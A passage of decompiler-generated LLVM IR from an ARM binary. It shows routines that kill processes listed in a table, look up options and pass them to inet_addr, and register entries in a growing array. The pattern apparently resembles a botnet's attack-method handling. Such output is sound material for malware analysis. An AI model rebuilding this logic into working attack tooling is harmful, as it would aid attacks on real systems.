  %v0_b04c = load i32, i32* @sb, align 4
  %v2_b04c = icmp eq i32 %v0_b04c, 0
  store i1 %v2_b04c, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_b04c, 1
  br i1 %tmp32, label %dec_label_pc_b074, label %dec_label_pc_b054

dec_label_pc_b054:                                ; preds = %dec_label_pc_b04c
  br label %dec_label_pc_b058

dec_label_pc_b058:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b054
  %v0_b064 = phi i32 [ %v1_b064, %dec_label_pc_b058 ], [ 0, %dec_label_pc_b054 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_b05c = mul i32 %v0_b064, 8
  %v5_b05c = add i32 %v4_b05c, %stack_var_-52.3
  %v6_b05c = inttoptr i32 %v5_b05c to i32*
  %v7_b05c = load i32, i32* %v6_b05c, align 4
  store i32 %v7_b05c, i32* %r0.global-to-local, align 4
  %v2_b060 = icmp eq i32 %v7_b05c, 0
  store i1 %v2_b060, i1* %cpsr_z.global-to-local, align 1
  %v1_b064 = add i32 %v0_b064, 1
  store i32 45164, i32* %lr.global-to-local, align 4
  %v1_b068 = xor i1 %v2_b060, true
  call void @__pseudo_cond_branch(i1 %v1_b068, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  %v0_b06c = load i32, i32* @sb, align 4
  %v9_b06c = icmp eq i32 %v0_b06c, %v1_b064
  store i1 %v9_b06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b06c, label %dec_label_pc_b074, label %dec_label_pc_b058

dec_label_pc_b074:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b04c
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  store i32 %v27_ae30, i32* %lr.global-to-local, align 4
  %v1_b080 = inttoptr i32 %stack_var_-52.3 to i32*
  call void @free(i32* %v1_b080)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 %stack_var_-52.3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_afec, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_afd8, { 1, 0 }
  uselistorder i32 %v2_af94, { 2, 1, 0 }
  uselistorder i32 %v2_afac, { 1, 0 }
  uselistorder i32 %v4_afa8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_af9c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_af98, { 1, 0 }
  uselistorder i32 %v0_af34, { 0, 2, 1 }
  uselistorder i32 %v0_af24, { 0, 2, 1, 3 }
  uselistorder i32 %v2_af20, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_af04, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_aee0, { 1, 0 }
  uselistorder i32 %v0_aec4, { 0, 2, 1 }
  uselistorder i32 %v0_aea0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_ae94, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder i32 %v2_ae80, { 2, 1, 0 }
  uselistorder i32 %v4_ae6c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_ae60, { 1, 0, 2 }
  uselistorder i32 %v0_ae40, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 22, 6, 2, 7, 10, 14, 11, 8, 9, 12, 13, 20, 15, 17, 16, 18, 19, 23, 21, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 2, 4, 0, 5, 3, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_b030, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_ae54, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_b084(i32 %arg1) local_unnamed_addr {
dec_label_pc_b084:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b084 = load i32, i32* @r4, align 4
  store i32 %v3_b084, i32* %stack_var_-12, align 4
  %v6_b084 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1cd84.116 to i32), i32* @r4, align 4
  %v2_b08c = load i32, i32* @global_var_1cd84.116, align 4
  %v2_b090 = icmp eq i32 %v2_b08c, 0
  br i1 %v2_b090, label %dec_label_pc_b098, label %dec_label_pc_b118

dec_label_pc_b098:                                ; preds = %dec_label_pc_b084
  %v3_b098 = load i32, i32* @global_var_1cd88.117, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b0a0 = icmp eq i32 %v3_b098, 0
  store i32 0, i32* @global_var_1cd84.116, align 4
  br i1 %v2_b0a0, label %dec_label_pc_b0ac, label %dec_label_pc_b134

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, %dec_label_pc_b098
  %v0_b0b4 = phi i32 [ %v0_b0b4.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ 0, %dec_label_pc_b098 ]
  %v1_b0b4 = phi i32 [ %v0_b0ac.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ ptrtoint (i32* @global_var_1cd84.116 to i32), %dec_label_pc_b098 ]
  %v1_b0ac = add i32 %v1_b0b4, 8
  %v2_b0ac = inttoptr i32 %v1_b0ac to i32*
  %v3_b0ac = load i32, i32* %v2_b0ac, align 4
  %v2_b0b0 = icmp eq i32 %v3_b0ac, 0
  %v2_b0b4 = add i32 %v1_b0b4, 4
  %v3_b0b4 = inttoptr i32 %v2_b0b4 to i32*
  store i32 %v0_b0b4, i32* %v3_b0b4, align 4
  br i1 %v2_b0b0, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v0_b0bc = load i32, i32* @r4, align 4
  %v1_b0bc = add i32 %v0_b0bc, 12
  %v2_b0bc = inttoptr i32 %v1_b0bc to i32*
  %v3_b0bc = load i32, i32* %v2_b0bc, align 4
  %v2_b0c0 = icmp eq i32 %v3_b0bc, 0
  %v0_b0c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0c4 = add i32 %v0_b0bc, 8
  %v3_b0c4 = inttoptr i32 %v2_b0c4 to i32*
  store i32 %v0_b0c4, i32* %v3_b0c4, align 4
  br i1 %v2_b0c0, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b0cc:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v0_b0cc = load i32, i32* @r4, align 4
  %v1_b0cc = add i32 %v0_b0cc, 16
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  %v3_b0cc = load i32, i32* %v2_b0cc, align 4
  %v2_b0d0 = icmp eq i32 %v3_b0cc, 0
  %v0_b0d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0d4 = add i32 %v0_b0cc, 12
  %v3_b0d4 = inttoptr i32 %v2_b0d4 to i32*
  store i32 %v0_b0d4, i32* %v3_b0d4, align 4
  br i1 %v2_b0d0, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v0_b0dc = load i32, i32* @r4, align 4
  %v1_b0dc = add i32 %v0_b0dc, 20
  %v2_b0dc = inttoptr i32 %v1_b0dc to i32*
  %v3_b0dc = load i32, i32* %v2_b0dc, align 4
  %v2_b0e0 = icmp eq i32 %v3_b0dc, 0
  %v0_b0e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0e4 = add i32 %v0_b0dc, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  store i32 %v0_b0e4, i32* %v3_b0e4, align 4
  br i1 %v2_b0e0, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b0ec:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v0_b0ec = load i32, i32* @r4, align 4
  %v1_b0ec = add i32 %v0_b0ec, 24
  %v2_b0ec = inttoptr i32 %v1_b0ec to i32*
  %v3_b0ec = load i32, i32* %v2_b0ec, align 4
  %v2_b0f0 = icmp eq i32 %v3_b0ec, 0
  %v0_b0f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0f4 = add i32 %v0_b0ec, 20
  %v3_b0f4 = inttoptr i32 %v2_b0f4 to i32*
  store i32 %v0_b0f4, i32* %v3_b0f4, align 4
  br i1 %v2_b0f0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b0fc:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v0_b0fc = load i32, i32* @r4, align 4
  %v1_b0fc = add i32 %v0_b0fc, 28
  %v2_b0fc = inttoptr i32 %v1_b0fc to i32*
  %v3_b0fc = load i32, i32* %v2_b0fc, align 4
  %v2_b100 = icmp eq i32 %v3_b0fc, 0
  %v0_b104 = load i32, i32* %r5.global-to-local, align 4
  %v2_b104 = add i32 %v0_b0fc, 24
  %v3_b104 = inttoptr i32 %v2_b104 to i32*
  store i32 %v0_b104, i32* %v3_b104, align 4
  br i1 %v2_b100, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac, %dec_label_pc_b1c4
  %v0_b10c = load i32, i32* %r5.global-to-local, align 4
  %v1_b10c = load i32, i32* @r4, align 4
  %v2_b10c = add i32 %v1_b10c, 28
  %v3_b10c = inttoptr i32 %v2_b10c to i32*
  store i32 %v0_b10c, i32* %v3_b10c, align 4
  %v2_b110 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b110, i32* @r4, align 4
  store i32 %v6_b084, i32* @r5, align 4
  %v0_b114 = call i32 @function_11694()
  br label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b084, %dec_label_pc_b10c
  %v0_b11c = call i32 @_kill()
  %v0_b120 = load i32, i32* @r4, align 4
  %v1_b120 = add i32 %v0_b120, 4
  %v2_b120 = inttoptr i32 %v1_b120 to i32*
  %v3_b120 = load i32, i32* %v2_b120, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b128 = icmp eq i32 %v3_b120, 0
  %v2_b12c = inttoptr i32 %v0_b120 to i32*
  store i32 0, i32* %v2_b12c, align 4
  br i1 %v2_b128, label %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, label %dec_label_pc_b134

dec_label_pc_b118.dec_label_pc_b0ac_crit_edge:    ; preds = %dec_label_pc_b118
  %v0_b0ac.pre = load i32, i32* @r4, align 4
  %v0_b0b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b0ac

dec_label_pc_b134:                                ; preds = %dec_label_pc_b098, %dec_label_pc_b118
  %v0_b138 = call i32 @_kill()
  %v0_b13c = load i32, i32* @r4, align 4
  %v1_b13c = add i32 %v0_b13c, 8
  %v2_b13c = inttoptr i32 %v1_b13c to i32*
  %v3_b13c = load i32, i32* %v2_b13c, align 4
  %v2_b140 = icmp eq i32 %v3_b13c, 0
  %v0_b144 = load i32, i32* %r5.global-to-local, align 4
  %v2_b144 = add i32 %v0_b13c, 4
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v0_b144, i32* %v3_b144, align 4
  br i1 %v2_b140, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v0_b150 = call i32 @_kill()
  %v0_b154 = load i32, i32* @r4, align 4
  %v1_b154 = add i32 %v0_b154, 12
  %v2_b154 = inttoptr i32 %v1_b154 to i32*
  %v3_b154 = load i32, i32* %v2_b154, align 4
  %v2_b158 = icmp eq i32 %v3_b154, 0
  %v0_b15c = load i32, i32* %r5.global-to-local, align 4
  %v2_b15c = add i32 %v0_b154, 8
  %v3_b15c = inttoptr i32 %v2_b15c to i32*
  store i32 %v0_b15c, i32* %v3_b15c, align 4
  br i1 %v2_b158, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v0_b168 = call i32 @_kill()
  %v0_b16c = load i32, i32* @r4, align 4
  %v1_b16c = add i32 %v0_b16c, 16
  %v2_b16c = inttoptr i32 %v1_b16c to i32*
  %v3_b16c = load i32, i32* %v2_b16c, align 4
  %v2_b170 = icmp eq i32 %v3_b16c, 0
  %v0_b174 = load i32, i32* %r5.global-to-local, align 4
  %v2_b174 = add i32 %v0_b16c, 12
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  store i32 %v0_b174, i32* %v3_b174, align 4
  br i1 %v2_b170, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v0_b180 = call i32 @_kill()
  %v0_b184 = load i32, i32* @r4, align 4
  %v1_b184 = add i32 %v0_b184, 20
  %v2_b184 = inttoptr i32 %v1_b184 to i32*
  %v3_b184 = load i32, i32* %v2_b184, align 4
  %v2_b188 = icmp eq i32 %v3_b184, 0
  %v0_b18c = load i32, i32* %r5.global-to-local, align 4
  %v2_b18c = add i32 %v0_b184, 16
  %v3_b18c = inttoptr i32 %v2_b18c to i32*
  store i32 %v0_b18c, i32* %v3_b18c, align 4
  br i1 %v2_b188, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b194:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v0_b198 = call i32 @_kill()
  %v0_b19c = load i32, i32* @r4, align 4
  %v1_b19c = add i32 %v0_b19c, 24
  %v2_b19c = inttoptr i32 %v1_b19c to i32*
  %v3_b19c = load i32, i32* %v2_b19c, align 4
  %v2_b1a0 = icmp eq i32 %v3_b19c, 0
  %v0_b1a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b1a4 = add i32 %v0_b19c, 20
  %v3_b1a4 = inttoptr i32 %v2_b1a4 to i32*
  store i32 %v0_b1a4, i32* %v3_b1a4, align 4
  br i1 %v2_b1a0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v0_b1b0 = call i32 @_kill()
  %v0_b1b4 = load i32, i32* @r4, align 4
  %v1_b1b4 = add i32 %v0_b1b4, 28
  %v2_b1b4 = inttoptr i32 %v1_b1b4 to i32*
  %v3_b1b4 = load i32, i32* %v2_b1b4, align 4
  %v2_b1b8 = icmp eq i32 %v3_b1b4, 0
  %v0_b1bc = load i32, i32* %r5.global-to-local, align 4
  %v2_b1bc = add i32 %v0_b1b4, 24
  %v3_b1bc = inttoptr i32 %v2_b1bc to i32*
  store i32 %v0_b1bc, i32* %v3_b1bc, align 4
  br i1 %v2_b1b8, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac
  %v0_b1c8 = call i32 @_kill()
  br label %dec_label_pc_b10c

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 11, 12, 13, 2, 3, 4, 0, 1, 7, 5, 6, 8, 9, 10, 14 }
  uselistorder label %dec_label_pc_b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b194, { 1, 0 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
  uselistorder label %dec_label_pc_b164, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 1, 0 }
  uselistorder label %dec_label_pc_b134, { 1, 0 }
  uselistorder label %dec_label_pc_b118, { 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_b0ec, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0cc, { 1, 0 }
  uselistorder label %dec_label_pc_b0bc, { 1, 0 }
}

define i32 @function_b1d4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_b1d4:
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v1_b1d4 = urem i32 %arg1, 256
  %v2_b1d8 = icmp eq i32 %v1_b1d4, 0
  br i1 %v2_b1d8, label %dec_label_pc_b224, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1d4
  %v0_b1e8 = load i32, i32* @r1, align 4
  %v1_b1e8 = add i32 %v0_b1e8, 4
  %v2_b1e8 = inttoptr i32 %v1_b1e8 to i8*
  %v3_b1e8 = load i8, i8* %v2_b1e8, align 1
  %v4_b1e8 = zext i8 %v3_b1e8 to i32
  %v1_b1ec = urem i32 %arg3, 256
  store i32 %v1_b1ec, i32* @r2, align 4
  %v9_b1f0 = icmp eq i32 %v4_b1e8, %v1_b1ec
  br i1 %v9_b1f0, label %dec_label_pc_b22c, label %dec_label_pc_b214.preheader

dec_label_pc_b214.preheader:                      ; preds = %dec_label_pc_b1e8
  br label %dec_label_pc_b214

dec_label_pc_b204:                                ; preds = %dec_label_pc_b214
  %v1_b204 = add i32 %v0_b20c.in, 12
  %v2_b204 = inttoptr i32 %v1_b204 to i8*
  %v3_b204 = load i8, i8* %v2_b204, align 1
  %v4_b204 = zext i8 %v3_b204 to i32
  %v9_b208 = icmp eq i32 %v1_b1ec, %v4_b204
  br i1 %v9_b208, label %dec_label_pc_b22c, label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b214.preheader, %dec_label_pc_b204
  %v0_b20c.in = phi i32 [ %v0_b1e8, %dec_label_pc_b214.preheader ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v0_b214 = phi i32 [ 0, %dec_label_pc_b214.preheader ], [ %v1_b214, %dec_label_pc_b204 ]
  %v0_b20c = add i32 %v0_b20c.in, 8
  %v1_b214 = add i32 %v0_b214, 1
  %v9_b218 = icmp eq i32 %v1_b1d4, %v1_b214
  store i32 %v0_b20c, i32* @r1, align 4
  br i1 %v9_b218, label %dec_label_pc_b224, label %dec_label_pc_b204

dec_label_pc_b224:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b22c, %dec_label_pc_b1d4
  ret i32 %arg4

dec_label_pc_b22c:                                ; preds = %dec_label_pc_b204, %dec_label_pc_b1e8
  %v0_b22c = phi i32 [ %v0_b1e8, %dec_label_pc_b1e8 ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v1_b22c = inttoptr i32 %v0_b22c to i32*
  %v2_b22c = load i32, i32* %v1_b22c, align 4
  store i32 %v2_b22c, i32* @r0, align 4
  %v2_b230 = icmp eq i32 %v2_b22c, 0
  br i1 %v2_b230, label %dec_label_pc_b224, label %dec_label_pc_b238

dec_label_pc_b238:                                ; preds = %dec_label_pc_b22c
  %v0_b23c = call i32 @_inet_addr()
  ret i32 %v0_b23c

; uselistorder directives
  uselistorder i32 %v1_b214, { 1, 0 }
  uselistorder i32 %v0_b20c, { 1, 0, 2 }
  uselistorder i32 %v0_b20c.in, { 1, 0 }
  uselistorder i32 %v1_b1ec, { 2, 1, 0 }
  uselistorder i32 %v0_b1e8, { 1, 0, 2 }
  uselistorder i32 %v1_b1d4, { 1, 0 }
  uselistorder label %dec_label_pc_b224, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
}

define i32 @function_b240(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b240:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b240 = urem i32 %arg1, 256
  %v2_b244 = icmp eq i32 %v1_b240, 0
  %v3_b248 = load i32, i32* @r4, align 4
  br i1 %v2_b244, label %dec_label_pc_b290, label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b240
  %v0_b254 = load i32, i32* %r1.global-to-local, align 4
  %v1_b254 = add i32 %v0_b254, 4
  %v2_b254 = inttoptr i32 %v1_b254 to i8*
  %v3_b254 = load i8, i8* %v2_b254, align 1
  %v4_b254 = zext i8 %v3_b254 to i32
  %v1_b258 = urem i32 %arg3, 256
  %v9_b25c = icmp eq i32 %v4_b254, %v1_b258
  br i1 %v9_b25c, label %dec_label_pc_b298, label %dec_label_pc_b280.preheader

dec_label_pc_b280.preheader:                      ; preds = %dec_label_pc_b254
  br label %dec_label_pc_b280

dec_label_pc_b270:                                ; preds = %dec_label_pc_b280
  %v1_b270 = add i32 %v0_b278.in, 12
  %v2_b270 = inttoptr i32 %v1_b270 to i8*
  %v3_b270 = load i8, i8* %v2_b270, align 1
  %v4_b270 = zext i8 %v3_b270 to i32
  %v9_b274 = icmp eq i32 %v1_b258, %v4_b270
  br i1 %v9_b274, label %dec_label_pc_b298, label %dec_label_pc_b280

dec_label_pc_b280:                                ; preds = %dec_label_pc_b280.preheader, %dec_label_pc_b270
  %v0_b278.in = phi i32 [ %v0_b254, %dec_label_pc_b280.preheader ], [ %v0_b278, %dec_label_pc_b270 ]
  %v0_b280 = phi i32 [ 0, %dec_label_pc_b280.preheader ], [ %v1_b280, %dec_label_pc_b270 ]
  %v0_b278 = add i32 %v0_b278.in, 8
  %v1_b280 = add i32 %v0_b280, 1
  store i32 %v1_b280, i32* @lr, align 4
  %v9_b284 = icmp eq i32 %v1_b240, %v1_b280
  store i32 %v0_b278, i32* %r1.global-to-local, align 4
  br i1 %v9_b284, label %dec_label_pc_b290, label %dec_label_pc_b270

dec_label_pc_b290:                                ; preds = %dec_label_pc_b280, %dec_label_pc_b298, %dec_label_pc_b240
  store i32 %v3_b248, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_b298:                                ; preds = %dec_label_pc_b270, %dec_label_pc_b254
  %v0_b298 = phi i32 [ %v0_b254, %dec_label_pc_b254 ], [ %v0_b278, %dec_label_pc_b270 ]
  %v1_b298 = inttoptr i32 %v0_b298 to i32*
  %v2_b298 = load i32, i32* %v1_b298, align 4
  %v2_b29c = icmp eq i32 %v2_b298, 0
  br i1 %v2_b29c, label %dec_label_pc_b290, label %dec_label_pc_b2a4

dec_label_pc_b2a4:                                ; preds = %dec_label_pc_b298
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_b248, i32* @r4, align 4
  %v2_b2ac = inttoptr i32 %v2_b298 to i8*
  %v3_b2ac = call i32 @function_13b80(i8* %v2_b2ac, i32 10)
  ret i32 %v3_b2ac

; uselistorder directives
  uselistorder i32 %v1_b280, { 1, 2, 0 }
  uselistorder i32 %v0_b278, { 1, 0, 2 }
  uselistorder i32 %v0_b278.in, { 1, 0 }
  uselistorder i32 %v1_b258, { 1, 0 }
  uselistorder i32 %v0_b254, { 1, 0, 2 }
  uselistorder i32 %v3_b248, { 1, 0 }
  uselistorder i32 %v1_b240, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b290, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
}

define i32 @function_b2b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_b2b0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b2b0 = load i32, i32* @r4, align 4
  store i32 %v3_b2b0, i32* %stack_var_-20, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b2bc = call i32 @_calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1cd7c.110 to i32), i32* %r4.global-to-local, align 4
  %v2_b2c4 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b2c4 = zext i8 %v2_b2c4 to i32
  store i32 ptrtoint (i32* @global_var_1cd80.112 to i32), i32* %r6.global-to-local, align 4
  store i32 56988, i32* %r2.global-to-local, align 4
  store i32 %v2_b2bc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b2d8 = mul nuw nsw i32 %v3_b2c4, 4
  store i32 %v3_b2d8, i32* %r1.global-to-local, align 4
  %v2_b2dc = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b2e0 = inttoptr i32 %v2_b2bc to i32*
  store i32 56988, i32* %v2_b2e0, align 4
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = trunc i32 %v0_b2e4 to i8
  %v2_b2e4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b2e4 = add i32 %v2_b2e4, 4
  %v4_b2e4 = inttoptr i32 %v3_b2e4 to i8*
  store i8 %v1_b2e4, i8* %v4_b2e4, align 1
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 4
  store i32 %v1_b2e8, i32* %r1.global-to-local, align 4
  %v4_b2ec = inttoptr i32 %v2_b2dc to i32*
  %v5_b2ec = call i32* @realloc(i32* %v4_b2ec, i32 %v1_b2e8)
  %v7_b2ec = ptrtoint i32* %v5_b2ec to i32
  %v2_b2f0 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b2f0 = zext i8 %v2_b2f0 to i32
  store i32 %v3_b2f0, i32* %r3.global-to-local, align 4
  store i32 %v7_b2ec, i32* %ip.global-to-local, align 4
  %v0_b2f8 = load i32, i32* %r5.global-to-local, align 4
  %v5_b2f8 = mul nuw nsw i32 %v3_b2f0, 4
  %v6_b2f8 = add i32 %v5_b2f8, %v7_b2ec
  %v7_b2f8 = inttoptr i32 %v6_b2f8 to i32*
  store i32 %v0_b2f8, i32* %v7_b2f8, align 4
  store i32 ptrtoint (i8* @global_var_1cd7d.121 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b308 = load i32, i32* %r4.global-to-local, align 4
  %v3_b308 = inttoptr i32 %v2_b308 to i8*
  store i8 ptrtoint (i8* @global_var_1cd7d.121 to i8), i8* %v3_b308, align 1
  %v0_b30c = load i32, i32* %ip.global-to-local, align 4
  %v1_b30c = load i32, i32* %r6.global-to-local, align 4
  %v2_b30c = inttoptr i32 %v1_b30c to i32*
  store i32 %v0_b30c, i32* %v2_b30c, align 4
  %v2_b310 = call i32 @_calloc(i32 1, i32 8)
  %v2_b314 = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b314 = zext i8 %v2_b314 to i32
  store i32 ptrtoint (i32* @global_var_e528.123 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 %v2_b310, i32* %r5.global-to-local, align 4
  %v3_b324 = mul nuw nsw i32 %v3_b314, 4
  store i32 %v3_b324, i32* %r1.global-to-local, align 4
  %v2_b328 = load i32, i32* @global_var_1cd80.112, align 4
  %v2_b32c = inttoptr i32 %v2_b310 to i32*
  store i32 ptrtoint (i32* @global_var_e528.123 to i32), i32* %v2_b32c, align 4
  %v0_b330 = load i32, i32* %r7.global-to-local, align 4
  %v1_b330 = trunc i32 %v0_b330 to i8
  %v2_b330 = load i32, i32* %r5.global-to-local, align 4
  %v3_b330 = add i32 %v2_b330, 4
  %v4_b330 = inttoptr i32 %v3_b330 to i8*
  store i8 %v1_b330, i8* %v4_b330, align 1
  %v0_b334 = load i32, i32* %r1.global-to-local, align 4
  %v1_b334 = add i32 %v0_b334, 4
  store i32 %v1_b334, i32* %r1.global-to-local, align 4
  %v3_b338 = inttoptr i32 %v2_b328 to i32*
  %v4_b338 = call i32* @realloc(i32* %v3_b338, i32 %v1_b334)
  %v6_b338 = ptrtoint i32* %v4_b338 to i32
  %v2_b33c = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_b33c = zext i8 %v2_b33c to i32
  store i32 %v3_b33c, i32* %r3.global-to-local, align 4
  store i32 %v6_b338, i32* %ip.global-to-local, align 4
  %v0_b344 = load i32, i32* %r5.global-to-local, align 4
  %v5_b344 = mul nuw nsw i32 %v3_b33c, 4
  %v6_b344 = add i32 %v5_b344, %v6_b338
  %v7_b344 = inttoptr i32 %v6_b344 to i32*
  store i32 %v0_b344, i32* %v7_b344, align 4
  %v0_b348 = load i32, i32* %r3.global-to-local, align 4
  %v1_b348 = load i32, i32* %r7.global-to-local, align 4
  %v2_b348 = add i32 %v1_b348, %v0_b348
  store i32 %v2_b348, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b354 = load i32, i32* %ip.global-to-local, align 4
